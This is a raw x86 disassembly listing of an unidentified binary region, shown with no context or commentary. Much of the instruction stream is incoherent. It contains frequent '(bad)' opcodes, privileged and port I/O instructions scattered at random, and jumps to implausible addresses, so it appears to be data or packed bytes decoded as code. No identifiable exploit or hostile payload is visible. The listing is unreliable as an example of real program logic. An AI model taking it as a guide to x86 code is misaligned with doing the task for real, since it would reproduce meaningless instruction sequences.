  43153b:	rol    BYTE PTR [eax],0x8d
  43153e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431542:	nop
  431543:	push   ecx
  431544:	add    bh,bh
  431546:	mov    esp,edi
  431548:	in     al,0x85
  43154a:	jge    0x43154a
  43154c:	test   edi,edi
  43154e:	jne    0x4314d5
  431550:	(bad)  
  431551:	(bad)  
  431552:	sbb    bh,bh
  431554:	push   ebp
  431555:	inc    ebp
  431556:	call   0xffdc0fe6
  43155b:	add    BYTE PTR [ebp+0x66],al
  43155e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431564:	cmp    al,0x85
  431566:	ud0    eax,DWORD PTR [ebp-0x1]
  43156a:	test   DWORD PTR [edi+0x74],ecx
  43156d:	dec    edi
  43156e:	inc    DWORD PTR [ebp-0x530004]
  431574:	dec    DWORD PTR [edi-0x75]
  431577:	dec    esi
  431578:	cld    
  431579:	test   DWORD PTR [eax+0xff01ff],eax
  43157f:	icebp  
  431580:	add    BYTE PTR [edi-0x3a],cl
  431583:	test   ebx,eax
  431585:	inc    BYTE PTR [ebp-0x1]
  431588:	jne    0x43158a
  43158a:	mov    eax,DWORD PTR [eax]
  43158c:	cld    
  43158d:	xor    BYTE PTR [ecx+0x500155],cl
  431593:	push   ebp
  431594:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43159a:	add    BYTE PTR [ebp+0x35e90f50],al
  4315a0:	add    al,BYTE PTR [eax]
  4315a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4315a8:	add    ah,ch
  4315aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4315b0:	jmp    0xdf18a6
  4315b5:	(bad)  
  4315b6:	nop    ecx
  4315b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4315bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4315c2:	mov    eax,edi
  4315c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4315c7:	add    eax,0x45fef885
  4315cc:	dec    DWORD PTR [ebx+0x339445]
  4315d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4315d8:	dec    DWORD PTR [ebx-0x460f0375]
  4315de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4315df:	add    esi,edi
  4315e1:	add    bh,bh
  4315e3:	rdpmc  
  4315e5:	add    BYTE PTR [ebx],0x1
  4315e8:	mov    DWORD PTR [eax],eax
  4315ea:	add    al,0x45
  4315ec:	dec    DWORD PTR [ecx-0x360b3373]
  4315f2:	dec    DWORD PTR [esi]
  4315f4:	push   eax
  4315f5:	jne    0x43163c
  4315f7:	mov    esi,DWORD PTR [ebx]
  4315f9:	cld    
  4315fa:	add    esp,ecx
  4315fc:	push   eax
  4315fd:	inc    DWORD PTR [ebp-0x75]
  431600:	add    eax,0x800e4
  431605:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43160b:	mov    DWORD PTR [ecx],eax
  43160d:	sbb    al,0x0
  43160f:	leave  
  431610:	test   DWORD PTR [edi-0x2],eax
  431613:	jne    0x431614
  431615:	call   0xff44001a
  43161a:	xor    BYTE PTR [ebp+0x4d],al
  43161d:	mov    edi,edi
  43161f:	enter  0x8,0x4d
  431623:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431629:	mov    eax,DWORD PTR [eax]
  43162b:	cld    
  43162c:	add    DWORD PTR [ecx],ebx
  43162e:	inc    ebp
  43162f:	dec    ebp
  431630:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431636:	inc    eax
  431637:	dec    DWORD PTR [ecx-0x270375]
  43163d:	add    BYTE PTR [ebx-0x39d72701],cl
  431643:	xchg   ecx,eax
  431644:	ret    
  431645:	add    BYTE PTR [ebp-0x830075],al
  43164b:	add    BYTE PTR [ebp-0x75],al
  43164e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431654:	lea    edi,[edi-0xc]
  431657:	add    bh,bh
  431659:	mov    edx,DWORD PTR [eax-0x7b]
  43165c:	inc    ebp
  43165d:	rdpmc  
  43165f:	jne    0x431664
  431661:	add    BYTE PTR [eax-0x75],dl
  431664:	inc    ebp
  431665:	clc    
  431666:	add    eax,0x400009
  43166b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431671:	mov    eax,DWORD PTR [ecx]
  431673:	in     al,dx
  431674:	add    dh,al
  431676:	test   ebx,eax
  431678:	inc    BYTE PTR [ebp-0xff0001]
  43167e:	add    BYTE PTR [ebp-0x43],al
  431681:	cmp    esi,0xfffffff8
  431684:	(bad)  
  431685:	push   DWORD PTR [eax]
  431687:	add    BYTE PTR [ebp-0x3a],dl
  43168a:	test   ebx,eax
  43168c:	je     0x431613
  43168e:	mov    edi,edi
  431690:	sbb    al,0xff
  431692:	test   DWORD PTR gs:[eax],eax
  431695:	(bad)  
  431696:	js     0x431697
  431698:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43169e:	sub    eax,ebx
  4316a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4316a6:	add    eax,DWORD PTR [eax]
  4316a8:	dec    ebp
  4316a9:	push   eax
  4316aa:	mov    al,BYTE PTR [ebp+0x1]
  4316ad:	mov    eax,DWORD PTR [ebp-0x68]
  4316b0:	mov    eax,DWORD PTR [eax]
  4316b2:	sbb    bh,al
  4316b4:	or     ah,dh
  4316b6:	dec    ebp
  4316b7:	inc    DWORD PTR [eax+0x4]
  4316ba:	push   ecx
  4316bb:	add    BYTE PTR [edx-0x1],dh
  4316be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4316c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4316ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4316d4:	push   ecx
  4316d5:	cmp    BYTE PTR [ebx],al
  4316d7:	inc    ebp
  4316d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4316de:	(bad)  
  4316df:	(bad)  
  4316e0:	in     al,0xff
  4316e2:	add    BYTE PTR [ebp+0x0],al
  4316e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4316eb:	add    al,bh
  4316ed:	(bad)  
  4316ee:	jmp    0x8d85:0x74b0558d
  4316f5:	dec    DWORD PTR [eax]
  4316f7:	call   DWORD PTR [ebp-0x7b]
  4316fa:	mov    edi,esi
  4316fc:	lock call DWORD PTR [ebp-0x75]
  431700:	mov    esi,esp
  431702:	mov    ah,0xc6
  431704:	mov    bh,0xc3
  431706:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43170c:	add    DWORD PTR [eax],0x450050ff
  431712:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431718:	inc    edi
  43171a:	push   esp
  43171c:	jmp    0xcd00:0x650481ff
  431723:	mov    DWORD PTR [ebx],esi
  431725:	clc    
  431726:	cmp    edi,0xff9cff3c
  43172c:	jne    0x431736
  43172e:	mov    eax,eax
  431730:	add    esi,DWORD PTR [eax]
  431732:	int3   
  431733:	inc    ebp
  431734:	cmp    al,0x83
  431736:	add    BYTE PTR [eax],bl
  431738:	adc    DWORD PTR [ebx+0x768b5055],eax
  43173e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431744:	mov    edi,eax
  431746:	cmp    BYTE PTR [ebp+0x45],cl
  431749:	jmp    0x4316d6
  43174b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43174e:	inc    ebp
  43174f:	or     al,0x2
  431751:	dec    DWORD PTR [ebp+0x18]
  431754:	jne    0x4317ab
  431756:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43175c:	mov    edi,DWORD PTR [ebx]
  43175e:	in     al,0x50
  431760:	xchg   ecx,eax
  431761:	jmp    0x3436666
  431766:	adc    al,0x8b
  431768:	inc    ebp
  431769:	mov    al,ds:0x8b04008b
  43176e:	push   ebp
  43176f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431775:	push   ebp
  431776:	test   DWORD PTR [ebx-0x2800d701],ecx
  43177c:	inc    ebp
  43177d:	dec    ebp
  43177e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431784:	mov    DWORD PTR [eax],0xe9ff00f4
  43178a:	add    al,0x0
  43178c:	add    BYTE PTR [eax],al
  43178e:	mov    eax,edx
  431790:	push   eax
  431791:	rol    DWORD PTR [ebp-0xf0177],1
  431797:	bound  eax,QWORD PTR [ebp+0x50]
  43179a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4317a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4317a6:	mov    al,0xf
  4317a8:	test   DWORD PTR [edx],edx
  4317aa:	call   DWORD PTR [ebp-0x7a0001]
  4317b0:	(bad)  
  4317b1:	loop   0x4317b2
  4317b3:	jnp    0xc6990bb9
  4317b9:	mov    eax,ebx
  4317bb:	cmp    al,0x8b
  4317bd:	(bad)  
  4317be:	cld    
  4317bf:	shr    esi,0xc
  4317c2:	add    dl,al
  4317c4:	push   eax
  4317c5:	lea    eax,[ebp-0x1]
  4317c8:	mov    edx,esi
  4317ca:	cwde   
  4317cb:	cli    
  4317cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4317d2:	or     BYTE PTR [eax],cl
  4317d4:	inc    ebp
  4317d5:	dec    ebp
  4317d6:	inc    DWORD PTR [ebx+0x74803914]
  4317dc:	add    DWORD PTR [ebx+0x451800],ecx
  4317e2:	call   DWORD PTR [eax+edx*1]
  4317e5:	add    ecx,DWORD PTR [ebp-0x34]
  4317e8:	push   edi
  4317e9:	adc    al,0x8
  4317eb:	mov    edx,DWORD PTR [ebp-0x14]
  4317ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4317f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4317f5:	inc    DWORD PTR [eax+esi*8]
  4317f8:	inc    ebp
  4317f9:	stos   BYTE PTR es:[edi],al
  4317fa:	mov    edx,DWORD PTR [ebp-0x4]
  4317fd:	add    DWORD PTR [ebp-0x1c],eax
  431800:	mov    edx,DWORD PTR [ebp-0x70]
  431803:	cmp    eax,DWORD PTR [eax]
  431805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431806:	mov    eax,DWORD PTR [eax]
  431808:	cld    
  431809:	jae    0x43178b
  43180b:	add    eax,DWORD PTR [ecx]
  43180d:	clc    
  43180e:	add    BYTE PTR [eax+0x30],dl
  431811:	mov    DWORD PTR [ecx],esi
  431813:	clc    
  431814:	pop    ds
  431815:	inc    ebp
  431816:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43181c:	(bad)  
  43181d:	push   DWORD PTR [edi]
  43181f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431825:	(bad)  
  431826:	jae    0x431827
  431828:	mov    eax,DWORD PTR [ebp-0x740175]
  43182e:	sub    eax,DWORD PTR [eax]
  431830:	add    eax,DWORD PTR [eax]
  431832:	mov    DWORD PTR [ecx+0x5f],eax
  431835:	mov    DWORD PTR [ebx-0x4],ebx
  431838:	ret    0xff
  43183b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431841:	ret    
  431842:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431848:	add    BYTE PTR [ebp-0x7d],al
  43184b:	mov    DWORD PTR [eax],eax
  43184d:	add    al,0x84
  43184f:	inc    DWORD PTR [ecx]
  431851:	lea    eax,[eax]
  431853:	hlt    
  431854:	sar    bh,cl
  431856:	test   BYTE PTR [eax+0x1],dl
  431859:	inc    ebp
  43185a:	add    BYTE PTR [ebx],dh
  43185c:	test   BYTE PTR [ebx],0x84
  43185f:	push   eax
  431860:	add    BYTE PTR [ebp+0x0],al
  431863:	add    eax,0x86
  431868:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43186e:	add    BYTE PTR [ecx],al
  431870:	add    BYTE PTR [eax],al
  431872:	mov    esi,0x550030
  431877:	mov    ecx,DWORD PTR [edi]
  431879:	cld    
  43187a:	fidiv  DWORD PTR [ebp+0x0]
  43187d:	mov    edi,DWORD PTR [ecx]
  43187f:	xor    BYTE PTR [eax+eax*1],0x84
  431883:	add    eax,DWORD PTR [eax]
  431885:	sbb    BYTE PTR [eax],al
  431887:	jne    0x43183a
  431889:	mov    eax,DWORD PTR [ecx]
  43188b:	sbb    BYTE PTR [eax],al
  43188d:	mov    DWORD PTR [ebp-0x1],esp
  431890:	add    BYTE PTR [eax+0x30e45ca],bh
  431896:	ret    0xb7fc
  431899:	dec    ebp
  43189a:	or     al,0x89
  43189c:	dec    ebp
  43189d:	cld    
  43189e:	cmovne ecx,DWORD PTR [eax-0x75]
  4318a2:	add    edi,esp
  4318a4:	seto   BYTE PTR [esi-0x72ffffff]
  4318ab:	inc    ebp
  4318ac:	adc    al,0x8b
  4318ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4318b5:	cmp    DWORD PTR [edi+0x72],edx
  4318b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4318be:	gs cmp al,0x0
  4318c1:	je     0x431899
  4318c3:	push   eax
  4318c4:	sar    BYTE PTR [eax],1
  4318c6:	mov    bh,0x3e
  4318c8:	push   cs
  4318c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4318cf:	add    DWORD PTR [ecx+0x12],ebp
  4318d2:	dec    edx
  4318d3:	(bad)  
  4318d4:	mov    eax,edx
  4318d6:	in     al,dx
  4318d7:	adc    DWORD PTR [ecx],esi
  4318d9:	pop    esi
  4318da:	inc    ecx
  4318db:	leave  
  4318dc:	or     DWORD PTR [eax],ebx
  4318de:	gs push ebp
  4318e0:	add    ah,ch
  4318e2:	into   
  4318e3:	in     al,dx
  4318e4:	enter  0xb756,0xf0
  4318e8:	push   cs
  4318e9:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4318f3:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4318f9:	jnp    0x74439e01
  4318ff:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431905:	add    BYTE PTR [edi],cl
  431907:	mov    edi,DWORD PTR [ecx-0x78]
  43190a:	ltr    WORD PTR [ecx-0x7b]
  43190e:	dec    DWORD PTR [edi]
  431910:	clc    
  431911:	out    0x45,eax
  431913:	add    BYTE PTR [eax],cl
  431915:	cmp    ebx,0xffffff8c
  431918:	jge    0x43191a
  43191a:	jb     0x43192c
  43191c:	je     0x52199c
  431922:	pop    edx
  431923:	push   esi
  431924:	mov    ecx,DWORD PTR [edi]
  431926:	in     al,dx
  431927:	rol    DWORD PTR [ebp+0x0],1
  43192a:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431931:	cmp    DWORD PTR [ecx],0xfffffff0
  431934:	hlt    
  431935:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43193b:	(bad)  
  43193d:	push   eax
  43193e:	jns    0xb842fdbc
  431944:	lock push cs
  431946:	ror    edx,0x3
  431949:	test   BYTE PTR [ecx+0x5500e800],cl
  43194f:	dec    eax
  431950:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431954:	(bad)  
  431955:	mov    esi,0x7f33ff5f
  43195a:	inc    eax
  43195b:	test   DWORD PTR [edx],eax
  43195d:	je     0x43191f
  43195f:	mov    ecx,ecx
  431961:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431965:	and    eax,DWORD PTR [eax+0xf0103]
  43196b:	jp     0x431959
  43196d:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431971:	add    edx,DWORD PTR [edi+0x74]
  431974:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43197a:	add    BYTE PTR [ebp-0x74c48bbb],al
  431980:	je     0x431905
  431982:	cmp    eax,edi
  431984:	js     0x4319a9
  431986:	add    eax,0xeb0fc003
  43198b:	jns    0x431918
  43198d:	vmread DWORD PTR [ecx+0x45],ebx
  431991:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431997:	adc    al,0x8b
  431999:	jge    0x4319af
  43199b:	mov    edi,DWORD PTR [eax-0x4]
  43199e:	add    edi,DWORD PTR [edi]
  4319a0:	or     bh,bh
  4319a2:	push   ebp
  4319a3:	push   es
  4319a4:	mov    DWORD PTR [ebp-0x4],ebx
  4319a7:	add    edi,esi
  4319a9:	pop    es
  4319aa:	add    esi,DWORD PTR [edi-0x48ccf183]
  4319b0:	mov    DWORD PTR [esp+esi*8],ecx
  4319b3:	inc    ebp
  4319b4:	pop    ebp
  4319b5:	xor    DWORD PTR [esi-0x4],0x3b
  4319b9:	add    edx,DWORD PTR [ecx+edi*1]
  4319bc:	push   es
  4319bd:	clc    
  4319be:	mov    bh,0xdb
  4319c0:	jp     0x431979
  4319c2:	add    cl,BYTE PTR [esi]
  4319c4:	div    DWORD PTR [edi+0x4d8b0c1c]
  4319ca:	test   edi,edi
  4319cc:	je     0x4319c2
  4319ce:	mov    eax,ecx
  4319d0:	or     BYTE PTR [ebx],al
  4319d2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4319d8:	jbe    0x431a4c
  4319da:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4319e0:	add    ecx,DWORD PTR [esi]
  4319e2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4319e8:	add    eax,DWORD PTR [ebx-0x287af783]
  4319ee:	je     0x431a3d
  4319f0:	mov    DWORD PTR [ecx],edi
  4319f2:	mov    esi,eax
  4319f4:	hlt    
  4319f5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4319fc:	jb     0x4319be
  4319fe:	jmp    0x4319eb
  431a00:	xor    esi,DWORD PTR [ebx]
  431a02:	pop    edi
  431a03:	pop    esi
  431a04:	pop    ebx
  431a05:	ret    
  431a06:	ret    0x8b
  431a09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a0f:	xor    DWORD PTR [ecx],0xc
  431a12:	pushf  
  431a13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a19:	rdmsr  
  431a1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431a22:	dec    ebp
  431a23:	ret    
  431a24:	mov    edi,DWORD PTR [esi-0x4]
  431a27:	pop    eax
  431a28:	dec    ebp
  431a29:	jne    0x4319b6
  431a2b:	xor    edi,esp
  431a2d:	inc    eax
  431a2e:	dec    ebp
  431a2f:	jbe    0x431a84
  431a31:	inc    eax
  431a32:	pop    ebp
  431a33:	add    edx,DWORD PTR [esi+0x8]
  431a36:	push   esp
  431a37:	dec    eax
  431a38:	push   ecx
  431a39:	mov    eax,edi
  431a3b:	and    al,0xf0
  431a3d:	jo     0x431a2a
  431a3f:	mov    eax,DWORD PTR [ebx]
  431a41:	sbb    BYTE PTR [ebp+0x4d],cl
  431a44:	mov    eax,DWORD PTR [ebx]
  431a46:	nop
  431a47:	or     BYTE PTR [eax],al
  431a49:	jne    0x431aa2
  431a4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431a51:	cld    
  431a52:	xor    edi,edi
  431a54:	add    edi,DWORD PTR [ebp+0x3]
  431a57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431a5d:	js     0x4319e3
  431a5f:	jae    0x431a63
  431a61:	(bad)  
  431a63:	xor    al,0x5d
  431a65:	jmp    0x4319f2
  431a67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431a6e:	fdecstp 
  431a70:	test   BYTE PTR [edi],ah
  431a72:	add    bh,BYTE PTR [ebp+0x0]
  431a75:	add    ebx,DWORD PTR [ebp-0x77]
  431a78:	mov    edi,eax
  431a7a:	cmp    al,0x0
  431a7d:	adc    dh,BYTE PTR [ebx]
  431a7f:	jge    0x431a84
  431a81:	mov    edi,DWORD PTR [ebx]
  431a83:	jl     0x431a94
  431a85:	clc    
  431a86:	dec    edi
  431a87:	jge    0x431a89
  431a89:	mov    eax,DWORD PTR [ebx]
  431a8b:	jb     0x431a95
  431a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431a90:	mov    edi,edi
  431a92:	xor    edx,DWORD PTR [eax]
  431a94:	add    edi,DWORD PTR [ebx]
  431a96:	mov    DWORD PTR [ebp-0x10],edi
  431a99:	inc    edi
  431a9a:	pop    ebp
  431a9b:	jge    0x431ad8
  431a9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431aa1:	mov    edx,0xc05d87f0
  431aa6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431aaa:	fimul  WORD PTR [eax]
  431aac:	fist   WORD PTR [ebp+0x1c]
  431aaf:	in     al,dx
  431ab0:	jne    0x431a9e
  431ab2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431ab8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431abc:	fdivp  st(0),st
  431abe:	fild   WORD PTR [ebp+0x4510f85c]
  431ac4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431aca:	inc    ebp
  431acb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431ad1:	mov    ebp,DWORD PTR [ebx-0x4]
  431ad4:	adc    al,0x8b
  431ad6:	rcl    DWORD PTR [eax],0x48
  431ad9:	mov    esi,0x7080803
  431ade:	fiadd  WORD PTR [ebp+0x4d]
  431ae1:	(bad)  
  431ae2:	mov    edx,DWORD PTR [edx-0x4]
  431ae5:	mov    edx,DWORD PTR [ebp-0x4]
  431ae8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431aee:	mov    DWORD PTR [edi+0x872dc],edi
  431af4:	xlat   BYTE PTR ds:[ebx]
  431af5:	into   
  431af6:	ffreep st(6)
  431af8:	retf   0x6c7
  431afb:	iret   
  431afc:	dec    ebp
  431afd:	inc    ebp
  431afe:	mov    DWORD PTR [ebx],edi
  431b00:	fmul   QWORD PTR [edi]
  431b02:	dec    ebp
  431b03:	jnp    0x431b38
  431b05:	add    BYTE PTR [ebx],al
  431b07:	mov    ecx,DWORD PTR [esp+edi*8]
  431b0a:	inc    ebp
  431b0b:	dec    ebp
  431b0c:	lea    esi,[ebx]
  431b0e:	add    DWORD PTR [ebx],eax
  431b10:	jb     0x431b4d
  431b12:	add    BYTE PTR [edi],cl
  431b14:	inc    ebp
  431b15:	imul   eax,edi,0x858bd800
  431b1b:	cld    
  431b1c:	clc    
  431b1d:	mov    DWORD PTR [ebp+0x0],eax
  431b20:	inc    DWORD PTR [eax]
  431b22:	or     al,0xde
  431b24:	sbb    bh,0x1
  431b27:	retf   
  431b28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b2f:	dec    ebp
  431b30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b36:	enter  0x12de,0xdf
  431b3a:	inc    ebp
  431b3b:	pop    ebp
  431b3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b42:	add    DWORD PTR [edx],edx
  431b44:	add    BYTE PTR [ebp+0x50],dl
  431b47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b53:	or     ah,al
  431b55:	pop    ss
  431b56:	cdq    
  431b57:	push   ebp
  431b58:	clc    
  431b59:	mov    eax,DWORD PTR [ebp-0x4]
  431b5c:	xor    edx,edx
  431b5e:	add    esi,DWORD PTR [ebx]
  431b60:	cmp    eax,DWORD PTR [ebx]
  431b62:	hlt    
  431b63:	cmp    DWORD PTR [ebx],esp
  431b65:	or     al,BYTE PTR [ebp+0xf]
  431b68:	mov    eax,DWORD PTR [edx]
  431b6a:	loopne 0x431b6c
  431b6c:	(bad)  
  431b6d:	mov    ecx,esi
  431b6f:	cld    
  431b70:	pushf  
  431b71:	pop    ebp
  431b72:	fwait
  431b73:	mov    esi,DWORD PTR [edx]
  431b75:	lock mov eax,eax
  431b78:	adc    BYTE PTR [ebx],al
  431b7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b87:	dec    ebp
  431b88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431b8e:	(bad)  
  431b8f:	iret   
  431b90:	inc    ebp
  431b91:	(bad)  
  431b92:	jne    0x431be1
  431b94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431b9a:	(bad)  
  431b9b:	cmp    ebx,eax
  431b9d:	je     0x431b25
  431b9f:	add    edi,edi
  431ba1:	or     bh,bh
  431ba3:	dec    ebp
  431ba4:	inc    ebp
  431ba5:	mov    esi,DWORD PTR [ebx]
  431ba7:	cld    
  431ba8:	add    ecx,esi
  431baa:	cmp    ecx,DWORD PTR [eax-0xc]
  431bad:	mov    edx,DWORD PTR [edi]
  431baf:	or     BYTE PTR [ebp-0x7c],al
  431bb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bb8:	test   BYTE PTR [ebx+ebx*4],cl
  431bbb:	inc    ebp
  431bbc:	xor    bh,BYTE PTR [esi]
  431bbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bc5:	jne    0x431b8e
  431bc7:	mov    ebp,esp
  431bc9:	fcomp  DWORD PTR [ebx]
  431bcb:	add    BYTE PTR [ecx],al
  431bcd:	inc    DWORD PTR [ebp-0x75]
  431bd0:	(bad)  
  431bd1:	cld    
  431bd2:	add    al,0xce
  431bd4:	mov    ecx,edi
  431bd6:	cld    
  431bd7:	inc    ebp
  431bd8:	fidivr WORD PTR [ebx]
  431bda:	fbstp  TBYTE PTR [ebp-0x3e]
  431bdd:	mov    eax,DWORD PTR [eax]
  431bdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431be5:	fadd   st,st(7)
  431be7:	add    BYTE PTR [ebp-0x1],al
  431bea:	mov    ecx,DWORD PTR [esp+edi*8]
  431bed:	inc    ebp
  431bee:	mov    bh,0xc7
  431bf1:	loopne 0x431c38
  431bf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431bf9:	sbb    dh,BYTE PTR [ebx]
  431bfb:	pushf  
  431bfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c02:	mov    eax,edi
  431c04:	cwde   
  431c05:	inc    ebp
  431c06:	inc    ebp
  431c07:	jne    0x431b94
  431c09:	mov    esp,esp
  431c0b:	clc    
  431c0c:	add    al,0x4d
  431c0e:	mov    DWORD PTR [ebx],esi
  431c10:	or     al,0x33
  431c12:	inc    ebp
  431c13:	lea    ecx,[ebx-0x398d13fd]
  431c19:	add    bh,al
  431c1b:	inc    ebp
  431c1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c23:	add    ebp,esp
  431c25:	shufps xmm1,xmm3,0xc7
  431c29:	(bad)  
  431c2a:	jmp    0x74885753
  431c2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c35:	hlt    
  431c36:	mov    ecx,DWORD PTR [edi]
  431c38:	fadd   DWORD PTR [ebp+0x0]
  431c3b:	xor    ecx,DWORD PTR [edi]
  431c3d:	add    ecx,ecx
  431c3f:	cmp    edi,edi
  431c41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c45:	(bad)  
  431c46:	jmp    0x431bd3
  431c48:	mov    edi,esp
  431c4a:	or     al,0xc6
  431c4c:	inc    ebp
  431c4d:	(bad)  
  431c4e:	mov    eax,DWORD PTR [ebp+0x10]
  431c51:	jne    0x431bdc
  431c53:	mov    eax,DWORD PTR [ecx]
  431c55:	clc    
  431c56:	add    BYTE PTR [ebp-0x40],cl
  431c59:	xor    edx,DWORD PTR [eax-0x73]
  431c5c:	jne    0x431c5f
  431c5e:	push   DWORD PTR [edx+0x8]
  431c61:	add    BYTE PTR [ebp+0x45],al
  431c64:	mov    ebp,ecx
  431c66:	cld    
  431c67:	add    BYTE PTR [ebp+0x0],cl
  431c6a:	xor    eax,DWORD PTR [ebp+0x3]
  431c6d:	mov    DWORD PTR [ebx],edi
  431c6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c75:	sub    eax,0x5d330e4d
  431c7a:	lea    esi,[ebx]
  431c7c:	add    DWORD PTR [ebx],eax
  431c7e:	jb     0x431c69
  431c80:	add    BYTE PTR [eax],al
  431c82:	inc    ebp
  431c83:	add    bl,ch
  431c85:	inc    ebp
  431c86:	mov    esi,DWORD PTR [ebx]
  431c88:	or     al,0x3
  431c8a:	(bad)  
  431c8b:	mov    edi,eax
  431c8d:	in     al,dx
  431c8e:	scas   eax,DWORD PTR es:[edi]
  431c8f:	inc    ebp
  431c90:	mov    esi,DWORD PTR [ebx]
  431c92:	in     al,0x3
  431c94:	add    al,0x89
  431c96:	mov    ecx,DWORD PTR [eax+edi*8]
  431c99:	dec    ebp
  431c9a:	(bad)  
  431c9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431ca2:	mov    ecx,eax
  431ca4:	cld    
  431ca5:	push   es
  431ca6:	dec    ebp
  431ca7:	add    al,0x33
  431ca9:	mov    DWORD PTR [ebx],eax
  431cab:	in     al,dx
  431cac:	cmp    DWORD PTR [ebp-0x67],eax
  431caf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cb5:	mov    edx,DWORD PTR [ebp-0x4]
  431cb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431cbb:	xor    eax,DWORD PTR [ebp+0x3]
  431cbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431cc4:	xor    edi,esp
  431cc6:	jmp    0xff771a18
  431ccb:	add    ecx,DWORD PTR [ebp-0x3f]
  431cce:	xor    ebx,DWORD PTR [edi]
  431cd0:	add    eax,ecx
  431cd2:	cmp    ebx,DWORD PTR [eax]
  431cd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431cd7:	mov    ecx,DWORD PTR [eax]
  431cd9:	adc    BYTE PTR [ebp-0x80],al
  431cdc:	jmp    0x431cdf
  431cde:	mov    eax,DWORD PTR [eax]
  431ce0:	cld    
  431ce1:	mov    bh,0xc6
  431ce3:	push   ecx
  431ce4:	(bad)  
  431ce5:	jne    0x431d45
  431ce7:	dec    ecx
